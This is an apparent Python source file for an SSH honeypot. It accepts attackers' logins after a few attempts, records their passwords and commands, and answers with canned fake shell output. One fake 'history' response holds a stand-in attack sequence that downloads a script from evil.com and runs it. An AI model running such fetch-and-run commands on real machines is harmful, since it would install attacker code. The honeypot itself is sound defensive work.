"""
SSH Honeypot Server
===================
An asyncio-based fake SSH server that captures authentication attempts
and simulates an interactive shell to record attacker commands.

Uses Paramiko for SSH protocol handling.
"""

import asyncio
import asyncssh
import socket
import time
import os
import sys

from config import SSH_PORT, BIND_HOST, FAKE_HOSTNAME, FAKE_OS, MAX_AUTH_ATTEMPTS, INTERACTIVE_SHELL
from log_collector import collector

# Fake banner to look realistic
FAKE_BANNER = f"""
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux {FAKE_OS} x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of {time.strftime("%c")}

  System load:  0.08              Processes:           142
  Usage of /:   34.2% of 78.45GB   Users logged in:     2
  Memory usage: 23%               IPv4 address for eth0: 10.0.2.15
  Swap usage:   0%

Last login: {time.strftime("%a %b %d %H:%M:%S %Y")} from 192.168.1.105
"""

FAKE_PROMPT = "root@prod-server-01:~# "

# Fake filesystem responses
FAKE_RESPONSES = {
    "ls": "total 32\ndrwxr-xr-x 5 root root 4096 Jan 15 09:23 .\ndrwxr-xr-x 18 root root 4096 Jan 10 14:11 ..\n-rw------- 1 root root  892 Jan 15 08:45 .bash_history\n-rw-r--r-- 1 root root 3771 Jan 10 14:11 .bashrc\ndrwxr-xr-x 3 root root 4096 Jan 12 16:33 .config\n-rw-r--r-- 1 root root  161 Jan 10 14:11 .profile\ndrwxr-xr-x 2 root root 4096 Jan 14 11:22 backups\ndrwxr-xr-x 2 root root 4096 Jan 13 20:17 scripts\ndrwxr-xr-x 2 root root 4096 Jan 14 09:01 secrets",
    "pwd": "/root",
    "whoami": "root",
    "id": "uid=0(root) gid=0(root) groups=0(root)",
    "uname -a": f"Linux {FAKE_HOSTNAME} {FAKE_OS} #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
    "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin",
    "cat /etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.3 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"',
    "ps aux": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 168312 11356 ?        Ss   09:00   0:01 /sbin/init\nroot       412  0.0  0.2  72340 18234 ?        Ss   09:01   0:00 sshd: /usr/sbin/sshd\nroot       520  0.0  0.1  21540  8944 ?        Ss   09:02   0:00 /usr/sbin/cron\nroot       621  0.0  0.3  89234 24512 ?        S    09:05   0:02 nginx: worker process",
    "ifconfig": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255",
    "netstat -tlnp": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      412/sshd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      621/nginx",
    "cat /proc/version": f"Linux version {FAKE_OS} (buildd@lcy02-amd64-028) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #1 SMP",
    "history": "    1  ls -la\n    2  cd /etc\n    3  cat passwd\n    4  apt update\n    5  wget http://evil.com/payload.sh\n    6  chmod +x payload.sh\n    7  ./payload.sh",
}


class FakeSSHServer(asyncssh.SSHServer):
    """Fake SSH server that accepts any password after MAX_AUTH_ATTEMPTS."""

    def __init__(self):
        self.attempts = {}

    def connection_made(self, conn):
        self.peer = conn.get_extra_info("peername")
        self.source_ip = self.peer[0] if self.peer else "unknown"
        print(f"[SSH] Connection from {self.source_ip}")

    def connection_lost(self, exc):
        print(f"[SSH] Disconnected from {self.source_ip}")

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        """Log every password attempt, accept after MAX_AUTH_ATTEMPTS."""
        key = f"{self.source_ip}:{username}"
        self.attempts[key] = self.attempts.get(key, 0) + 1

        collector.log_event(
            "ssh_session",
            source_ip=self.source_ip,
            service="ssh",
            port=SSH_PORT,
            username=username,
            password=password,
            attempt_number=self.attempts[key],
            accepted=self.attempts[key] >= MAX_AUTH_ATTEMPTS
        )

        print(f"[SSH] Auth attempt #{self.attempts[key]} from {self.source_ip}: {username}:{password}")

        # Accept after MAX_AUTH_ATTEMPTS to keep attacker engaged
        return self.attempts[key] >= MAX_AUTH_ATTEMPTS


class FakeSSHSession:
    """Interactive fake shell session."""

    def __init__(self, stdin, stdout, stderr, source_ip):
        self.stdin = stdin
        self.stdout = stdout
        self.stderr = stderr
        self.source_ip = source_ip
        self.command_count = 0

    async def run(self):
        """Run the fake interactive shell."""
        self.stdout.write(FAKE_BANNER)
        self.stdout.write(FAKE_PROMPT)
        self.stdout.flush()

        while True:
            try:
                line = await self.stdin.readline()
                if not line:
                    break

                command = line.strip()
                if not command:
                    self.stdout.write(FAKE_PROMPT)
                    self.stdout.flush()
                    continue

                self.command_count += 1

                # Log the command
                collector.log_event(
                    "command_captured",
                    source_ip=self.source_ip,
                    service="ssh",
                    command=command,
                    command_number=self.command_count
                )
                print(f"[SSH] Command from {self.source_ip}: {command}")

                # Generate fake response
                response = self._handle_command(command)
                self.stdout.write(response + "\n" + FAKE_PROMPT)
                self.stdout.flush()

            except Exception as e:
                print(f"[SSH] Session error: {e}")
                break

    def _handle_command(self, cmd):
        """Return fake response for known commands, generic for unknown."""
        cmd_lower = cmd.lower().strip()

        # Direct match
        if cmd_lower in FAKE_RESPONSES:
            return FAKE_RESPONSES[cmd_lower]

        # Partial matches
        if cmd_lower.startswith("ls"):
            return FAKE_RESPONSES["ls"]
        if cmd_lower.startswith("cd"):
            return ""  # cd has no output on success
        if cmd_lower.startswith("cat"):
            return f"cat: {cmd.split()[-1]}: No such file or directory"
        if cmd_lower.startswith("wget") or cmd_lower.startswith("curl"):
            return f"--{time.strftime('%Y-%m-%d %H:%M:%S')}--  {cmd}\nResolving... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 24576 (24K) [application/octet-stream]\nSaving to: 'payload.bin'\n\npayload.bin       100%[===================>]  24.00K  --.-KB/s    in 0.1s\n\n{time.strftime('%Y-%m-%d %H:%M:%S')} (24.00 KB/s) - 'payload.bin' saved [24576/24576]"
        if cmd_lower.startswith("chmod"):
            return ""
        if cmd_lower.startswith("python") or cmd_lower.startswith("python3"):
            return 'Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>>'
        if cmd_lower.startswith("exit") or cmd_lower.startswith("logout"):
            return "logout\nConnection closed."

        # Generic "command not found" for unknown commands
        return f"bash: {cmd.split()[0]}: command not found"


async def handle_client(process):
    """Handle an SSH client connection."""
    source_ip = process.get_extra_info("peername")[0] if process.get_extra_info("peername") else "unknown"
    session = FakeSSHSession(
        process.stdin,
        process.stdout,
        process.stderr,
        source_ip
    )
    await session.run()


async def start_ssh_honeypot():
    """Start the SSH honeypot server."""
    # Generate host key if it doesn't exist
    host_key_path = "ssh_host_key"
    if not os.path.exists(host_key_path):
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        with open(host_key_path, "wb") as f:
            f.write(pem)
        print(f"[SSH] Generated host key: {host_key_path}")

    await asyncssh.create_server(
        FakeSSHServer,
        BIND_HOST,
        SSH_PORT,
        server_host_keys=[host_key_path],
        process_factory=handle_client
    )

    print(f"[SSH] Honeypot listening on {BIND_HOST}:{SSH_PORT}")
    print(f"[SSH] Interactive shell: {'ENABLED' if INTERACTIVE_SHELL else 'DISABLED'}")
    print(f"[SSH] Max auth attempts before acceptance: {MAX_AUTH_ATTEMPTS}")


if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(start_ssh_honeypot())
        loop.run_forever()
    except KeyboardInterrupt:
        print("\n[SSH] Server stopped.")
    except Exception as e:
        print(f"[SSH] Error: {e}")
